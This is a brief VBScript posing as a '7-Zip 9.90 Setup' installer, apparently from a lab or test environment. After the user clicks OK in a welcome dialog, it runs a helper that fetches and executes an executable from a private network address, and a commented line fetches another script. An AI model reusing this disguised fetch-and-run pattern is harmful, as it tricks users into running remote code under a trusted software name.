'WScript.Echo("Welcome to 7zip installer")
'\utils\runurl.bat http://192.168.56.1:8901/files/7z_newer.vbs 7z_newer.vbs
r = MsgBox("Welcome to 7zip installer, press OK to continue 7zip installation", 1, "7-Zip 9.90 Setup")
If r = 1 Then
    Set WshShell = WScript.CreateObject("WScript.Shell")
    cmd = "\utils\runurl.py http://192.168.56.1:8901/files/7z920.exe"
    WshShell.Run cmd
End If